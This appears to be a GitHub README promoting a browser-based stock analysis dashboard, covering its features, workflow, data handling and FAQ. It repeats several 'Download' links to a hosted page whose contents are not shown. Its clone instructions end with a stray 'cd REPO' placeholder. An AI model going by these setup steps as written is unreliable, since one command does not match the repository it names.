# Aktien-Cockpit v2026 - Stock Analysis Dashboard 2026

> **A browser-based stock research workspace for exploring global equities, building watchlists, and bringing valuation, quality, momentum, and risk information together.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/dylan-woodims7038/aktien-cockpit-analysis-2026?style=flat-square)](https://github.com/dylan-woodims7038/aktien-cockpit-analysis-2026)

---

<p align="center">
  <a href="https://dylan-woodims7038.github.io/aktien-cockpit-analysis-2026/">
    <img src="https://img.shields.io/badge/Download-Aktien--Cockpit%20Latest-brightgreen?style=for-the-badge" alt="Download Aktien-Cockpit">
  </a>
</p>

> **[Download Aktien-Cockpit v2026](https://dylan-woodims7038.github.io/aktien-cockpit-analysis-2026/)**

---

[Download Latest Build](https://dylan-woodims7038.github.io/aktien-cockpit-analysis-2026/)

---

## Overview

Aktien-Cockpit provides a browser-based environment for researching shares and keeping track of market developments. Users can search roughly 19,500 stocks, assess multiple analytical indicators, read market news, and manage a personal collection of favorites without installing a separate desktop application.

Valuation, quality, timing, momentum, chart information, and risk analysis are presented within one research flow. The dashboard also includes local favorites, PDF-ready reports, currency display choices, and data loading with retry and fallback behavior for recurring use.

---

## What You Can Do

- Find companies across a database of approximately 19,500 stocks worldwide.
- Keep selected equities in a browser-based local favorites list.
- Assess quality, valuation, timing, and momentum scores.
- Review suggested entry areas, stop concepts, price targets, and risk-reward ratios.
- Analyze price charts that include 50-day and 200-day moving averages.
- Create a 16-phase analysis dossier containing risk metrics.
- Read RSS market and economic news, with matching against saved watchlist entries.
- Display supported figures in their original currency, EUR, or USD.
- Retrieve information from several sources using retries, failover handling, and caching.
- Prepare research results for printing as PDF reports.
- Update the ticker database weekly with GitHub Actions.

---

## Getting Started

Aktien-Cockpit is a static web application that can be published through GitHub Pages or hosted by another static web server.

### Download the Application

Launch the latest hosted version here:

[Download Aktien-Cockpit](https://dylan-woodims7038.github.io/aktien-cockpit-analysis-2026/)

### Use a Local Checkout

```bash
git clone https://github.com/dylan-woodims7038/aktien-cockpit-analysis-2026.git
cd REPO
```

After cloning, serve the repository directory with a static web server and open the local URL it provides in a modern browser. A directly launchable HTML entry point may also work when opened from the filesystem, but using a local server is usually more reliable for browser-based data access.

---

## Typical Workflow

1. Start Aktien-Cockpit in a modern browser.
2. Enter a company name or ticker in the global stock search.
3. Select an equity profile to inspect its scores, charts, risk data, and analysis dossier.
4. Save securities of interest to the local favorites list.
5. Use entry areas, targets, stop concepts, and risk-reward details as part of the comparison process.
6. Browse market and economic stories supplied through the RSS newsfeed.
7. Apply watchlist matching to identify news connected with saved equities.
8. Set the desired display currency for available values.
9. Use the browser print function to create a PDF version of the visible analysis.

---

## Configuration and Data Handling

The dashboard saves favorites in the browser's local storage. As a result, browser storage permissions and site-data retention affect whether the watchlist is still present later.

Currency presentation is configurable within the application and supports original currency, EUR, and USD. Data retrieval uses several sources and incorporates retries, failover, and caching.

GitHub Actions handles scheduled ticker database maintenance. Weekly database updates help keep the stock search functionality current.

---

## Requirements

- A current web browser with JavaScript enabled.
- Internet access for current stock data and RSS news.
- Enough browser storage for favorites and cached information.
- A static hosting service or local HTTP server when running the project yourself.
- GitHub Actions availability if weekly ticker database updates are enabled through a fork or deployment workflow.
- Browser support for printing to PDF when creating printable reports.

---

## Frequently Asked Questions

### What type of user is Aktien-Cockpit designed for?

Aktien-Cockpit is built for browser-based stock analysis, equity research, watchlist tracking, and review of market news.

### Where does the application keep my favorites?

The favorites list is saved locally in the browser. Removing site data or switching to another browser can make the saved list unavailable.

### Are multiple display currencies available?

Yes. Values can be shown in the original currency, EUR, or USD where supported.

### When is the ticker database refreshed?

GitHub Actions is configured to refresh the ticker database once per week.

### What can I try when information fails to load?

First refresh the page and verify the browser's network connection. The application attempts retries and uses caching and multiple sources, although individual sources may not always be available.

### Is PDF output supported?

Yes. The analysis screens can be printed through the browser's print dialog and saved as PDF.

### How can I stay informed about new versions?

Use the hosted build to access the currently published release, or follow the repository for project changes and updated builds.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
